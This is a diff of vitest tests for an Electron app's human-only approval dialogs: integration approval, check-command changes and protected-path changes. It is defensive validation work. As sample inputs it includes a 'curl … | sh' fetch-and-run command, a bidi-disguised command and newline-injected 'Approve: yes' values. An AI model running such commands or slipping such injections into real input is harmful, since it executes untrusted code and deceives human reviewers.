@@ -4,7 +4,9 @@ import { describe, expect, it, vi } from "vitest";
 import type { components } from "../api/schema";
 import {
 	LADO_PRESENCE_ADOPT_SETUP_CHANNEL,
+	LADO_PRESENCE_APPROVE_INTEGRATION_CHANNEL,
 	LADO_PRESENCE_APPROVE_PLAN_CHANNEL,
+	LADO_PRESENCE_CHANGE_PROJECT_CHECKS_CHANNEL,
 	LADO_PRESENCE_CHANGE_RULE_CHANNEL,
 	LADO_PRESENCE_CHANGE_SETUP_CHANNEL,
 	LADO_PRESENCE_RESTORE_SETUP_CHANNEL,
@@ -12,6 +14,9 @@ import {
 	type LadoPresenceAdoptSetupResult,
 	type LadoPresenceApproval,
 	type LadoPresenceApproveResult,
+	type LadoPresenceChecksResult,
+	type LadoPresenceIntegration,
+	type LadoPresenceIntegrationResult,
 	type LadoPresenceModeResult,
 	type LadoPresenceProjectSettings,
 	type LadoPresenceRestoreSetupResult,
@@ -150,8 +155,11 @@ function ceilingRule(overrides: Partial<LadoPresenceRule> = {}): LadoPresenceRul
 
 const changedCeiling = ceilingRule({ ceiling: { mode: "bypass-permissions" }, version: 3, versionId: "lado-rule-version-3" });
 
+// The hash the daemon gives a project without check commands.
+const NO_COMMANDS_SHA = "4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945";
+
 function settingsResponse(ladoMode = true): LadoPresenceProjectSettings {
-	return { projectId: "demo", ladoMode, maxConcurrent: 1 };
+	return { projectId: "demo", ladoMode, maxConcurrent: 1, checkCommands: [], checkCommandsSha256: NO_COMMANDS_SHA, checkTimeoutMinutes: 30 };
 }
 
 function projectResponse(name = "Demo app"): components["schemas"]["ProjectGetResponse"] {
@@ -319,6 +327,121 @@ function scopeItem(overrides: Partial<components["schemas"]["LadoSetupItemStateR
 	};
 }
 
+// LADO fork: verification and the integration approval (step 8).
+const HEAD = "1234567890abcdef1234567890abcdef12345678";
+const VERIFY_SHA = "9".repeat(64);
+const PR_URL = "https://github.com/acme/demo/pull/7";
+const PATHS_RULE = "paths.protected";
+type ExecutionResponse = components["schemas"]["LadoExecutionResponse"];
+type VerifyItem = components["schemas"]["LadoVerifyItemResponse"];
+
+function executionResponse(overrides: Partial<ExecutionResponse> = {}): ExecutionResponse {
+	return {
+		attempt: 1,
+		base: { dispatchSha: "f".repeat(40) },
+		plan: { approvedAt: "2026-10-27T00:00:00Z", number: 3, revisionId: "lado-plan-1", sha256: SHA },
+		pr: { closed: false, headSha: HEAD, merged: false, number: 7, targetBranch: "main", title: "fix: 로그인 테스트", url: PR_URL },
+		sessionEnded: false,
+		sessionId: "demo-7",
+		state: "integration_pending",
+		snapshot: {
+			agent: "claude-code",
+			permissionCeiling: "auto",
+			permissionMode: "auto",
+			prompt: "",
+			rules: [],
+			setup: [],
+			sha256: POLICY_SHA,
+		},
+		startedAt: "2026-10-27T00:00:00Z",
+		task: { id: "lado-task-1", issueRef: "github:acme/demo#12", issueUrl: "https://github.com/acme/demo/issues/12", title: "Fix the flaky login test" },
+		...overrides,
+	};
+}
+
+// What needs confirming: an unclear commit, paths outside the plan and an
+// unprotected base branch; review and evidence only inform.
+const confirmItems: VerifyItem[] = [
+	{ kind: "required_checks", outcome: "pass", details: { required: ["ci"], rulesetRead: true, checks: [] } },
+	{ kind: "commands", outcome: "pass", details: { runs: [] } },
+	{
+		kind: "commit_messages",
+		outcome: "confirm",
+		code: "commit_messages_unclear",
+		details: {
+			commits: [
+				{ sha: "abcdef1234567890abcdef1234567890abcdef12", subject: "update", result: "unclear" },
+				{ sha: "bcdef1234567890abcdef1234567890abcdef123", subject: "로그인 테스트 고침", result: "ok" },
+			],
+			prTitle: { text: "fix: 로그인 테스트", result: "ok" },
+		},
+	},
+	{
+		kind: "paths",
+		outcome: "confirm",
+		code: "outside_plan",
+		details: { protected: [], outsidePlan: ["docs/a.md", "docs/b.md", "src/c.ts", "src/d.ts"], outsideCount: 4 },
+	},
+	{ kind: "base_branch", outcome: "pass", code: "no_local_branch", details: { branch: "main", remote: "origin", moved: [], alreadyOnBase: false } },
+	{
+		kind: "protection",
+		outcome: "confirm",
+		code: "unprotected",
+		details: { provider: "github", repo: "acme/demo", branch: "main", missing: ["pull_request", "required_status_checks:lado/integration"] },
+	},
+	{ kind: "review", outcome: "info", code: "not_required", details: {} },
+	{ kind: "evidence", outcome: "info", details: { criteria: [] } },
+];
+const confirmCodes = ["commit_messages_unclear", "outside_plan", "unprotected"];
+
+type IntegrationOverrides = { outcome?: "pass" | "wait" | "fail" | "confirm"; items?: VerifyItem[]; confirm?: string[]; headSha?: string };
+
+function integrationPreview(overrides: IntegrationOverrides = {}): LadoPresenceIntegration {
+	return {
+		confirm: overrides.confirm ?? confirmCodes,
+		verification: {
+			computedAt: "2026-10-27T00:05:00Z",
+			evidence: [],
+			headSha: overrides.headSha ?? HEAD,
+			items: overrides.items ?? confirmItems,
+			outcome: overrides.outcome ?? "confirm",
+			prUrl: PR_URL,
+			sha256: VERIFY_SHA,
+		},
+		verificationSha256: VERIFY_SHA,
+	};
+}
+
+const integrationApproved: LadoPresenceIntegration = {
+	...integrationPreview(),
+	approval: {
+		acknowledged: confirmCodes,
+		actor: "human",
+		approvedAt: "2026-10-27T00:06:00Z",
+		headSha: HEAD,
+		id: "lado-integration-1",
+		targetBranch: "main",
+		statusAttempts: 1,
+		statusPostedAt: "2026-10-27T00:06:01Z",
+		statusState: "posted",
+		verificationSha256: VERIFY_SHA,
+	},
+};
+
+function pathsRule(globs: string[], overrides: Partial<LadoPresenceRule> = {}): LadoPresenceRule {
+	return ceilingRule({
+		category: "git",
+		ceiling: undefined,
+		enforcement: ["validator", "prompt"],
+		id: PATHS_RULE,
+		name: "Protected paths",
+		paths: { globs },
+		version: 1,
+		versionId: "lado-rule-version-paths-1",
+		...overrides,
+	});
+}
+
 type Route = () => Response | Promise<Response>;
 type Routes = {
 	plan?: Route;
@@ -336,6 +459,9 @@ type Routes = {
 	changePreview?: Route;
 	change?: Route;
 	scopeItems?: Route;
+	execution?: Route;
+	integrationPreview?: Route;
+	integration?: Route;
 };
 
 function setup(overrides: Partial<LadoPresenceDeps> = {}, routes: Routes = {}) {
@@ -363,6 +489,13 @@ function setup(overrides: Partial<LadoPresenceDeps> = {}, routes: Routes = {}) {
 			if (pathname.startsWith("/api/v1/lado/setup/adoptions/")) return routes.adoption ? routes.adoption() : json(200, adoptionDetail());
 			if (dryRun) return routes.changePreview ? routes.changePreview() : json(200, changePreview());
 			return routes.change ? routes.change() : json(200, changePreview({ applied: true, actor: "human" }));
+		}
+		if (pathname.startsWith("/api/v1/lado/executions/")) {
+			if (init.method === "GET") return routes.execution ? routes.execution() : json(200, executionResponse());
+			if (typeof init.body === "string" && JSON.parse(init.body).dryRun === true) {
+				return routes.integrationPreview ? routes.integrationPreview() : json(200, integrationPreview());
+			}
+			return routes.integration ? routes.integration() : json(200, integrationApproved);
 		}
 		if (init.method === "GET" && pathname.startsWith("/api/v1/lado/plans/")) {
 			return routes.plan ? routes.plan() : json(200, planResponse());
@@ -404,7 +537,18 @@ function setup(overrides: Partial<LadoPresenceDeps> = {}, routes: Routes = {}) {
 	const adoptSetupHandler = handlers.get(LADO_PRESENCE_ADOPT_SETUP_CHANNEL);
 	const restoreSetupHandler = handlers.get(LADO_PRESENCE_RESTORE_SETUP_CHANNEL);
 	const changeSetupHandler = handlers.get(LADO_PRESENCE_CHANGE_SETUP_CHANNEL);
-	if (!approveHandler || !changeRuleHandler || !setModeHandler || !adoptSetupHandler || !restoreSetupHandler || !changeSetupHandler) {
+	const integrationHandler = handlers.get(LADO_PRESENCE_APPROVE_INTEGRATION_CHANNEL);
+	const checksHandler = handlers.get(LADO_PRESENCE_CHANGE_PROJECT_CHECKS_CHANNEL);
+	if (
+		!approveHandler ||
+		!changeRuleHandler ||
+		!setModeHandler ||
+		!adoptSetupHandler ||
+		!restoreSetupHandler ||
+		!changeSetupHandler ||
+		!integrationHandler ||
+		!checksHandler
+	) {
 		throw new Error("a presence channel is not registered");
 	}
 	return {
@@ -420,6 +564,10 @@ function setup(overrides: Partial<LadoPresenceDeps> = {}, routes: Routes = {}) {
 			restoreSetupHandler({ sender }, input) as Promise<LadoPresenceRestoreSetupResult>,
 		changeSetup: (input: unknown, sender: unknown = shell) =>
 			changeSetupHandler({ sender }, input) as Promise<LadoPresenceSetupChangeResult>,
+		approveIntegration: (input: unknown, sender: unknown = shell) =>
+			integrationHandler({ sender }, input) as Promise<LadoPresenceIntegrationResult>,
+		changeChecks: (input: unknown, sender: unknown = shell) =>
+			checksHandler({ sender }, input) as Promise<LadoPresenceChecksResult>,
 		calls,
 		dialog,
 		fetch,
@@ -1623,5 +1771,449 @@ describe("changing local setup", () => {
 			"Claude Code · MCP server · search Turn on at Global",
 			"New version",
 		]);
+	});
+});
+
+// LADO fork: approving a head's integration lets its pull request merge
+// (docs/LJY-PRD/TDD.md §7.1), so only the human may do it.
+describe("approving an integration", () => {
+	const executionPath = "/api/v1/lado/executions/demo-7";
+	const approvePath = `${executionPath}/integration-approve`;
+	const previewBody = JSON.stringify({ prUrl: PR_URL, headSha: HEAD, dryRun: true });
+
+	it("reads the run and its dry run itself, confirms, then signs what the dry run verified", async () => {
+		const { approveIntegration, calls, dialog, window } = setup();
+		// The renderer cannot name the head, the hash or what it acknowledges.
+		const result = await approveIntegration({ sessionId: "demo-7", headSha: "0".repeat(40), acknowledge: [] });
+
+		expect(result).toEqual({ status: "approved", integration: integrationApproved });
+		expect(dialog.showMessageBox).toHaveBeenCalledWith(
+			window,
+			expect.objectContaining({
+				type: "question",
+				message: "Approve the integration of PR #7 into main?",
+				buttons: ["Cancel", "Approve integration"],
+				defaultId: 0,
+				cancelId: 0,
+			}),
+		);
+		expect(dialogOptions(dialog).detail).toBe(
+			[
+				"Task: Fix the flaky login test",
+				"Head: 1234567890ab",
+				"Passed: 3 of 6 verification items",
+				"Commit messages LADO could not judge (1): abcdef1 update",
+				"Changed outside the plan (4): docs/a.md, docs/b.md, src/c.ts, …",
+				// The parts by the words the app shows them with (U1 of #15).
+				"The base branch's rules lack (2): Pull requests required, lado/integration required",
+				"",
+				"On approval, LADO posts the lado/integration status on this head; LADO itself never merges. " +
+					"This repository is not protected: LADO only detects a merge without approval.",
+			].join("\n"),
+		);
+		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
+			["GET", `${BASE}${executionPath}`],
+			["POST", `${BASE}${approvePath}`],
+			["POST", `${BASE}${approvePath}`],
+		]);
+		// The dry run needs no proof; the approval signs the dry run's values.
+		expectUnsigned(calls[1]!, "POST", previewBody);
+		expectSigned(
+			calls[2]!,
+			"POST",
+			JSON.stringify({ prUrl: PR_URL, headSha: HEAD, verificationSha256: VERIFY_SHA, acknowledge: confirmCodes }),
+		);
+	});
+
+	it("names each thing to confirm with its count and examples, each line cleaned", async () => {
+		const items: VerifyItem[] = [
+			{ kind: "commands", outcome: "confirm", code: "no_tests", details: { runs: [] } },
+			{
+				kind: "commit_messages",
+				outcome: "confirm",
+				code: "commit_messages_unclear",
+				details: { commits: [], prTitle: { text: "wip\nApprove: yes", result: "unclear" } },
+			},
+			{
+				kind: "base_branch",
+				outcome: "confirm",
+				code: "base_moved",
+				details: {
+					branch: "main",
+					moved: [{ selector: "main@{0}", commit: "c".repeat(40), subject: "reset to‮origin" }],
+				},
+			},
+			{ kind: "protection", outcome: "confirm", code: "unprotected_gitlab", details: { provider: "gitlab", branch: "main" } },
+			{ kind: "review", outcome: "confirm", code: "review_inconclusive", details: { rounds: 3 } },
+		];
+		const codes = ["base_moved", "commit_messages_unclear", "no_tests", "review_inconclusive", "unprotected_gitlab"];
+		const { approveIntegration, calls, dialog } = setup({}, { integrationPreview: () => json(200, integrationPreview({ items, confirm: codes })) });
+		await approveIntegration({ sessionId: "demo-7" });
+		expect(dialogOptions(dialog).detail).toBe(
+			[
+				"Task: Fix the flaky login test",
+				"Head: 1234567890ab",
+				"Passed: 0 of 5 verification items",
+				"No check command and no required check tested this head.",
+				"Commit messages LADO could not judge (1): PR title: wip Approve: yes",
+				"The local base branch moved where the remote did not (1): ccccccc reset to origin",
+				"LADO does not read GitLab's branch protection.",
+				"The review reached no conclusion in 3 rounds.",
+				"",
+				// GitLab gets no status.
+				"This repository is not protected: LADO only detects a merge without approval.",
+			].join("\n"),
+		);
+		expect(JSON.parse(String(calls[2]!.init.body)).acknowledge).toEqual(codes);
+	});
+
+	it("does not ask while LADO still verifies the head or a check on it failed", async () => {
+		const items: VerifyItem[] = [
+			{ kind: "required_checks", outcome: "fail", code: "checks_failed", details: { checks: [] } },
+			{ kind: "commands", outcome: "wait", code: "commands_running", details: { runs: [] } },
+			{ kind: "review", outcome: "wait", code: "review_pending", details: {} },
+		];
+		const { approveIntegration, calls, dialog } = setup({}, { integrationPreview: () => json(200, integrationPreview({ outcome: "fail", items, confirm: [] })) });
+		await expect(approveIntegration({ sessionId: "demo-7" })).resolves.toMatchObject({
+			status: "error",
+			code: "LADO_INTEGRATION_NOT_READY",
+			details: { reasons: ["checks_failed", "commands_running", "review_pending"] },
+		});
+		expect(dialog.showMessageBox).not.toHaveBeenCalled();
+		expect(calls.map(({ init }) => init.method)).toEqual(["GET", "POST"]);
+	});
+
+	it("does not ask about a run without an open pull request, a head LADO has not seen or one approved already", async () => {
+		const cases: [Partial<ExecutionResponse>, string][] = [
+			[{ pr: undefined }, "LADO_EXECUTION_NO_PR"],
+			[{ pr: { closed: false, merged: true, number: 7, url: PR_URL, headSha: HEAD } }, "LADO_EXECUTION_NO_PR"],
+			[{ pr: { closed: true, merged: false, number: 7, url: PR_URL, headSha: HEAD } }, "LADO_EXECUTION_NO_PR"],
+			[{ pr: { closed: false, merged: false, number: 7, url: PR_URL } }, "LADO_INTEGRATION_NOT_READY"],
+			[{ integration: integrationApproved.approval }, "LADO_INTEGRATION_ALREADY_APPROVED"],
+		];
+		for (const [overrides, code] of cases) {
+			const { approveIntegration, calls, dialog } = setup({}, { execution: () => json(200, executionResponse(overrides)) });
+			await expect(approveIntegration({ sessionId: "demo-7" }), code).resolves.toMatchObject({ status: "error", code });
+			expect(dialog.showMessageBox).not.toHaveBeenCalled();
+			expect(calls.map(({ init }) => init.method)).toEqual(["GET"]);
+		}
+	});
+
+	it("sends nothing when the human cancels", async () => {
+		const { approveIntegration, calls, dialog } = setup();
+		dialog.showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
+		await expect(approveIntegration({ sessionId: "demo-7" })).resolves.toEqual({ status: "cancelled" });
+		// Only the read and the dry run, which needs no proof.
+		expect(calls.map(({ init }) => init.method)).toEqual(["GET", "POST"]);
+		expectUnsigned(calls[1]!, "POST", previewBody);
+	});
+
+	it("refuses an untrusted sender and an invalid session id", async () => {
+		for (const [input, sender, code] of [
+			[{ sessionId: "demo-7" }, { id: 99 }, "LADO_PRESENCE_UNTRUSTED_SENDER"],
+			[{ sessionId: "../demo" }, undefined, "LADO_SESSION_ID_INVALID"],
+			[{ sessionId: "" }, undefined, "LADO_SESSION_ID_INVALID"],
+			[null, undefined, "LADO_SESSION_ID_INVALID"],
+		] as const) {
+			const { approveIntegration, dialog, fetch } = setup();
+			await expect(approveIntegration(input, sender ?? undefined), code).resolves.toMatchObject({ status: "error", code });
+			expect(fetch).not.toHaveBeenCalled();
+			expect(dialog.showMessageBox).not.toHaveBeenCalled();
+		}
+	});
+
+	it("does not ask about a dry run of another head and returns the daemon's refusals", async () => {
+		const other = setup({}, { integrationPreview: () => json(200, integrationPreview({ headSha: "e".repeat(40) })) });
+		await expect(other.approveIntegration({ sessionId: "demo-7" })).resolves.toMatchObject({ status: "error", code: UNREADABLE });
+		expect(other.dialog.showMessageBox).not.toHaveBeenCalled();
+
+		const moved = {
+			error: "conflict",
+			code: "LADO_INTEGRATION_HEAD_CHANGED",
+			message: "The pull request has a new head.",
+			details: { headSha: HEAD, currentHeadSha: "e".repeat(40) },
+		};
+		const refusedPreview = setup({}, { integrationPreview: () => json(409, moved) });
+		await expect(refusedPreview.approveIntegration({ sessionId: "demo-7" })).resolves.toEqual({
+			status: "error",
+			code: moved.code,
+			message: moved.message,
+			details: moved.details,
+		});
+		expect(refusedPreview.dialog.showMessageBox).not.toHaveBeenCalled();
+
+		const changed = { error: "conflict", code: "LADO_VERIFICATION_CHANGED", message: "The verification changed." };
+		const refused = setup({}, { integration: () => json(409, changed) });
+		await expect(refused.approveIntegration({ sessionId: "demo-7" })).resolves.toEqual({
+			status: "error",
+			code: changed.code,
+			message: changed.message,
+		});
+	});
+
+	// Review fixes of #15: rules LADO could not read may protect the branch
+	// (U4), a check from one app only cannot be LADO's (Q3), and a deleted
+	// local base branch is named (V7).
+	it("words protection and the base branch as they stand", async () => {
+		const withItem = (item: VerifyItem) => confirmItems.map((other) => (other.kind === item.kind ? item : other));
+		const detailOf = async (items: VerifyItem[], confirm: string[]) => {
+			const { approveIntegration, dialog } = setup({}, { integrationPreview: () => json(200, integrationPreview({ items, confirm })) });
+			await approveIntegration({ sessionId: "demo-7" });
+			return dialogOptions(dialog).detail ?? "";
+		};
+		const unknown = await detailOf(
+			withItem({
+				kind: "protection",
+				outcome: "confirm",
+				code: "protection_unknown",
+				details: { provider: "github", repo: "acme/demo", branch: "main", missing: [], errorClass: "http_502", error: "the host answered 502" },
+			}),
+			["commit_messages_unclear", "outside_plan", "protection_unknown"],
+		);
+		expect(unknown).toContain("LADO could not read the base branch's rules: the host answered 502");
+		expect(unknown).not.toContain("This repository is not protected");
+
+		const appBound = await detailOf(
+			withItem({
+				kind: "protection",
+				outcome: "confirm",
+				code: "unprotected",
+				details: { provider: "github", repo: "acme/demo", branch: "main", missing: ["required_status_checks:lado/integration:any_source"] },
+			}),
+			confirmCodes,
+		);
+		expect(appBound).toContain("The base branch's rules lack (1): lado/integration from any source");
+		expect(appBound).toContain("set the check's source to “Any source”");
+		expect(appBound).toContain("This repository is not protected");
+
+		const deleted = await detailOf(
+			withItem({
+				kind: "base_branch",
+				outcome: "confirm",
+				code: "base_deleted",
+				details: { branch: "main", remote: "origin", moved: [], alreadyOnBase: false, dispatchCommit: "c".repeat(40), deleted: true },
+			}),
+			["base_deleted", ...confirmCodes],
+		);
+		expect(deleted).toContain("The local main was at ccccccc when the run started and is gone now.");
+	});
+
+	it("words the confirmation from main's catalog in the current language", async () => {
+		const { approveIntegration, dialog } = setup({ locale: () => "ko" });
+		await approveIntegration({ sessionId: "demo-7" });
+		const ko = trayCatalogs.ko;
+		const options = dialogOptions(dialog);
+		expect(options.message).toBe(ko["lado.presence.integration.title"].replace("{{number}}", "7").replace("{{branch}}", "main"));
+		expect(options.buttons).toEqual([ko["lado.presence.cancel"], ko["lado.presence.integration.approve"]]);
+		expect(options.detail?.split("\n")[0]).toBe(ko["lado.presence.integration.task"].replace("{{task}}", "Fix the flaky login test"));
+		expect(options.detail).toContain(ko["lado.presence.integration.nextUnprotected"]);
+	});
+});
+
+// LADO fork: a project's check commands run outside any agent sandbox, so
+// only the human may change them.
+describe("changing check commands", () => {
+	const settingsPath = "/api/v1/lado/projects/demo/settings";
+	const current = [
+		{ name: "test", command: "npm test" },
+		{ name: "lint", command: "npm run lint" },
+	];
+	const withCommands = (checkCommands: { name: string; command: string }[]) => ({ ...settingsResponse(), checkCommands });
+
+	it("names the commands added, changed and removed, then signs a change of the commands only", async () => {
+		const next = [
+			{ name: "lint", command: "npm run lint -- --max-warnings 0" },
+			{ name: "build", command: "npm run build  &&  npm run e2e" },
+		];
+		const saved = withCommands(next);
+		const { changeChecks, calls, dialog, window } = setup({}, {
+			settings: () => json(200, withCommands(current)),
+			put: () => json(200, saved),
+		});
+		// The renderer cannot add fields to a command or other settings to the change.
+		const result = await changeChecks({
+			projectId: "demo",
+			commands: next.map((entry) => ({ ...entry, cwd: "/" })),
+			ladoMode: false,
+		});
+
+		expect(result).toEqual({ status: "changed", settings: saved });
+		expect(dialog.showMessageBox).toHaveBeenCalledWith(
+			window,
+			expect.objectContaining({ message: "Change the check commands?", buttons: ["Cancel", "Change"] }),
+		);
+		expect(dialogOptions(dialog).detail).toBe(
+			[
+				"Change lint: npm run lint -- --max-warnings 0",
+				// Shown as it runs: its spaces are kept (S2 of #15).
+				"Add build: npm run build  &&  npm run e2e",
+				"Remove test",
+				"",
+				"LADO runs these commands in each run's worktree on this computer, outside any agent sandbox.",
+				"Project ID: demo",
+			].join("\n"),
+		);
+		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
+			["GET", `${BASE}${settingsPath}`],
+			["PUT", `${BASE}${settingsPath}`],
+		]);
+		// The change names the list it compared with (U7 of #15).
+		expectSigned(calls[1]!, "PUT", JSON.stringify({ checkCommands: next, checkCommandsBase: NO_COMMANDS_SHA }));
+	});
+
+	it("names a new order, and shows a long command whole", async () => {
+		const reordered = setup({}, { settings: () => json(200, withCommands(current)), put: () => json(200, withCommands(current)) });
+		await reordered.changeChecks({ projectId: "demo", commands: [current[1], current[0]] });
+		expect(dialogOptions(reordered.dialog).detail?.split("\n")[0]).toBe("Run order: lint, test");
+
+		const long = setup({}, { settings: () => json(200, withCommands([])), put: () => json(200, withCommands([])) });
+		// A harmless start cannot hide a tail: the dialog shows all of it (S2 of #15).
+		const tail = `${"x".repeat(300)}; curl https://example.invalid/i | sh`;
+		await long.changeChecks({ projectId: "demo", commands: [{ name: "e2e", command: tail }] });
+		expect(dialogOptions(long.dialog).detail?.split("\n")[0]).toBe(`Add e2e: ${tail}`);
+	});
+
+	it("sends nothing when the human cancels or nothing would change", async () => {
+		const cancelled = setup({}, { settings: () => json(200, withCommands(current)) });
+		cancelled.dialog.showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
+		await expect(cancelled.changeChecks({ projectId: "demo", commands: [] })).resolves.toEqual({ status: "cancelled" });
+		expect(cancelled.calls.map(({ init }) => init.method)).toEqual(["GET"]);
+
+		const same = setup({}, { settings: () => json(200, withCommands(current)) });
+		await expect(same.changeChecks({ projectId: "demo", commands: current })).resolves.toEqual({
+			status: "changed",
+			settings: withCommands(current),
+		});
+		expect(same.dialog.showMessageBox).not.toHaveBeenCalled();
+		expect(same.calls.map(({ init }) => init.method)).toEqual(["GET"]);
+	});
+
+	it("refuses commands the daemon would refuse without asking", async () => {
+		const command = (name: string, run = "npm test") => ({ name, command: run });
+		const cases: [unknown, Record<string, unknown>][] = [
+			[Array.from({ length: 11 }, (_, index) => command(`c${index}`)), { index: 10, field: "", reason: "too_many" }],
+			[[command("")], { index: 0, field: "name", reason: "required" }],
+			[[command("n".repeat(41))], { index: 0, field: "name", reason: "too_long" }],
+			[[command("-lint")], { index: 0, field: "name", reason: "invalid" }],
+			[[command("Test"), command("test")], { index: 1, field: "name", reason: "duplicate" }],
+			[[command("test", "  ")], { index: 0, field: "command", reason: "required" }],
+			[[command("test", "x".repeat(2001))], { index: 0, field: "command", reason: "too_long" }],
+			// One command is one line, without direction controls (S2 of #15).
+			[[command("test", "npm\0test")], { index: 0, field: "command", reason: "control_character", position: 4, character: "U+0000" }],
+			[[command("build", "npm run build\nnpm run e2e")], { index: 0, field: "command", reason: "control_character", position: 14, character: "U+000A" }],
+			[[command("build", "make\tall")], { index: 0, field: "command", reason: "control_character", position: 5, character: "U+0009" }],
+			[[command("build", "make\u2028all")], { index: 0, field: "command", reason: "control_character", position: 5, character: "U+2028" }],
+			[[command("build", "make all #\u202ehs | lruc")], { index: 0, field: "command", reason: "bidi_control", position: 11, character: "U+202E" }],
+		];
+		for (const [commands, details] of cases) {
+			const { changeChecks, dialog, fetch } = setup();
+			await expect(changeChecks({ projectId: "demo", commands }), JSON.stringify(details)).resolves.toMatchObject({
+				status: "error",
+				code: "LADO_CHECK_COMMANDS_INVALID",
+				details,
+			});
+			expect(fetch).not.toHaveBeenCalled();
+			expect(dialog.showMessageBox).not.toHaveBeenCalled();
+		}
+		for (const [input, sender, code] of [
+			[{ projectId: "demo", commands: [] }, { id: 99 }, "LADO_PRESENCE_UNTRUSTED_SENDER"],
+			[{ projectId: "../demo", commands: [] }, undefined, "LADO_PROJECT_ID_INVALID"],
+		] as const) {
+			const { changeChecks, fetch } = setup();
+			await expect(changeChecks(input, sender ?? undefined), code).resolves.toMatchObject({ status: "error", code });
+			expect(fetch).not.toHaveBeenCalled();
+		}
+	});
+});
+
+// LADO fork: the protected paths keep workers away from CI, agent
+// instructions and LADO's own files, so only the human may change them.
+describe("changing protected paths", () => {
+	const rulePath = `/api/v1/lado/rules/${PATHS_RULE}`;
+	const current = [".github/**", "**/CLAUDE.md", ".ao/**"];
+	const changedPaths = pathsRule([".github/**", ".ao/**", "infra/**"], { version: 2, versionId: "lado-rule-version-paths-2" });
+
+	it("names the globs added and removed, then signs the change", async () => {
+		const { changeRule, calls, dialog, window } = setup({}, {
+			rule: () => json(200, { rule: pathsRule(current), versions: [] }),
+			patch: () => json(200, { applied: true, impact: { projects: [], tasks: [] }, rule: changedPaths }),
+		});
+		// The globs are trimmed; the renderer cannot pick the base version.
+		const result = await changeRule({ ruleId: PATHS_RULE, paths: { globs: [" .github/** ", ".ao/**", "infra/**"] }, baseVersion: 9 });
+
+		expect(result).toEqual({ status: "changed", rule: changedPaths });
+		expect(dialog.showMessageBox).toHaveBeenCalledWith(
+			window,
+			expect.objectContaining({ message: "Change the protected paths?", buttons: ["Cancel", "Change"] }),
+		);
+		expect(dialogOptions(dialog).detail).toBe(
+			"Protect: infra/**\nNo longer protect: **/CLAUDE.md\n\n" +
+				"Workers may not change protected paths unless the approved plan names them. " +
+				"Tasks approved under the current rules need a new approval.",
+		);
+		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
+			["GET", `${BASE}${rulePath}`],
+			["PATCH", `${BASE}${rulePath}`],
+		]);
+		expectSigned(calls[1]!, "PATCH", JSON.stringify({ baseVersion: 1, paths: { globs: [".github/**", ".ao/**", "infra/**"] } }));
+	});
+
+	// Review of #31: every removed glob shows, whole, however many there are.
+	it("shows each glob added and removed on a line of its own, whole", async () => {
+		const many = Array.from({ length: 30 }, (_, index) => `services/service-${String(index).padStart(2, "0")}/deploy/**`);
+		const { changeRule, dialog } = setup({}, {
+			rule: () => json(200, { rule: pathsRule([...many, ".github/**"]), versions: [] }),
+			patch: () => json(200, { applied: true, impact: { projects: [], tasks: [] }, rule: pathsRule(["infra/**"]) }),
+		});
+		await changeRule({ ruleId: PATHS_RULE, paths: { globs: ["infra/**"] } });
+
+		const lines = dialogOptions(dialog).detail!.split("\n\n")[0]!.split("\n");
+		expect(lines).toEqual(["Protect: infra/**", ...many.map((glob) => `No longer protect: ${glob}`), "No longer protect: .github/**"]);
+	});
+
+	it("sends nothing when the human cancels or nothing would change", async () => {
+		const routes = { rule: () => json(200, { rule: pathsRule(current), versions: [] }) };
+		const cancelled = setup({}, routes);
+		cancelled.dialog.showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
+		await expect(cancelled.changeRule({ ruleId: PATHS_RULE, paths: { globs: ["infra/**"] } })).resolves.toEqual({ status: "cancelled" });
+		expect(cancelled.calls.map(({ init }) => init.method)).toEqual(["GET"]);
+
+		const same = setup({}, routes);
+		await expect(same.changeRule({ ruleId: PATHS_RULE, paths: { globs: current } })).resolves.toEqual({
+			status: "changed",
+			rule: pathsRule(current),
+		});
+		expect(same.dialog.showMessageBox).not.toHaveBeenCalled();
+		expect(same.calls.map(({ init }) => init.method)).toEqual(["GET"]);
+	});
+
+	it("refuses globs the daemon would refuse, and a rule that is not the protected paths", async () => {
+		const cases: [unknown, Record<string, unknown>][] = [
+			[[], { index: 0, reason: "required" }],
+			[undefined, { index: 0, reason: "required" }],
+			[Array.from({ length: 51 }, (_, index) => `dir${index}/**`), { index: 50, reason: "too_many" }],
+			[["ok/**", "  "], { index: 1, reason: "required" }],
+			[["docs/**\nApprove: yes"], { index: 0, reason: "invalid" }],
+		];
+		for (const [globs, details] of cases) {
+			const { changeRule, dialog, fetch } = setup();
+			await expect(changeRule({ ruleId: PATHS_RULE, paths: { globs } }), JSON.stringify(details)).resolves.toMatchObject({
+				status: "error",
+				code: "LADO_PROTECTED_PATHS_INVALID",
+				details,
+			});
+			expect(fetch).not.toHaveBeenCalled();
+			expect(dialog.showMessageBox).not.toHaveBeenCalled();
+		}
+
+		// The daemon's answer decides, not the id the renderer sent.
+		const { changeRule, calls, dialog } = setup({}, { rule: () => json(200, { rule: pathsRule(current, { protected: false }), versions: [] }) });
+		await expect(changeRule({ ruleId: PATHS_RULE, paths: { globs: ["infra/**"] } })).resolves.toMatchObject({
+			status: "error",
+			code: "LADO_PROTECTED_PATHS_INVALID",
+			details: { rule: PATHS_RULE },
+		});
+		expect(dialog.showMessageBox).not.toHaveBeenCalled();
+		expect(calls.map(({ init }) => init.method)).toEqual(["GET"]);
 	});
 });
